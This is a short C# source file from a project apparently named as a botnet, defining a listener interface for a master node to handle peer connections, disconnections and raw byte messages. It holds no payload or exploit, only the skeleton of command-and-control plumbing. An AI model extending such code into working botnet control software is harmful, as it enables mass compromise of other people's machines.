using CozyThunder.Botnet.Common;

namespace CozyThunder.Botnet.Interface
{
    public interface IMasterPeerListener
    {
        void OnConnect(Peer peer);
        void OnDisConnect(Peer peer);
        void OnMessage(Peer peer, byte[] msg);
    }
}
